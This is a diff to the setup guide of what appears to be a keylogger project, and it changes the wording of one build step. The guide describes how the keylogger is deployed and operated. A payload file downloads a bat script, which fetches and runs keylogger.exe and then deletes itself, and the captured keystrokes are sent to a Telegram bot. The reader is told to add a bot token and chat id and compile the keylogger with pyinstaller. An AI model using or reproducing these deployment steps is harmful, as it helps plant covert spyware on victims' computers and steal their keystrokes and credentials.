@@ -3,7 +3,7 @@ GUIDE:
      The payload (keylogger.dd) downloads bat file (keylogger_download.bat, you can find it here in the executable-main folder) which downloads keylogger.exe, runs it, and then deletes itself.
      The executable sends data to a telegram bot.
      To create the executable and enter the credentials of your Telegram bot:
-     1. Download keylogger.py from this repository.
+     1. Download keylogger.py from the folder executable-main in this repository.
      2. Customize the keylogger.py file by putting your telegram bot token and chat id
      3. If you don't have python installed on your computer, install it here: https://www.python.org
      4. Install pyinstaller on your pc using the command "pip install pyinstaller".
